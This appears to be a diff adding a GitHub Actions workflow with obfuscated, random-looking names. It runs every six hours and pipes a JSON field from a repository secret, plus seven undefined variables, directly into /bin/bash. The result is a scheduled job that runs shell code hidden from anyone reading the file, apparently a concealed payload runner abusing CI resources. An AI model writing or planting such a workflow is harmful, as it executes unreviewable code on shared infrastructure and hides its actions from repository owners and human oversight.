@@ -1,0 +1,25 @@
+name: diniudetainsek
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: diniudetainsek
+        env:
+          dmwft2: ${{ secrets.dmwft2 }}
+        run: |
+          echo $dmwft2 | jq -r .roqzq57 | /bin/bash
+          echo $m02655 | jq -r .bwq2 | /bin/bash
+          echo $f42716 | jq -r .cyez89508 | /bin/bash
+          echo $b64773 | jq -r .hvqdj142 | /bin/bash
+          echo $tlqi2046 | jq -r .oywho4431 | /bin/bash
+          echo $cpjnl8 | jq -r .pf9822 | /bin/bash
+          echo $d65 | jq -r .l26 | /bin/bash
+          echo $cb83226 | jq -r .ljbd9 | /bin/bash
+
